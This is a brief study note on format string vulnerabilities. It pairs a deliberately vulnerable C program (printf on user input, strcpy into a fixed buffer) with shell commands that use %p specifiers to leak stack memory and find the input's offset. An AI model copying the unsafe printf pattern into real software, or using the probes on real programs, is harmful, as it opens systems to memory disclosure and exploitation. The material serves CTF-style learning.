# Format String Vulnerability
- https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/
- [fmtstr_payloadを紐解いて書式文字列攻撃を理解する #脆弱性 - Qiita](https://qiita.com/mae_t/items/91a82f8efe361305c29b)
# example1
```c
// gcc -m32 chall.c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
    char buffer[64];
    strcpy(buffer, argv[1]);
    printf(buffer);
    printf("\n");
    return 0;
}
```

```bash
./a.out $(python3 -c 'print("AAAA,"+",".join(["%p" for _ in range(20)]))')
AAAA,0xffc5a15f,(nil),0x565981e4,0xf7ef7540,0xffffffff,0x56597034,0xffc592c4,0xf7f30608,0xb,0xffc5920c,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70

./a.out "AAAA,%11\$p"
AAAA,0x41414141
```
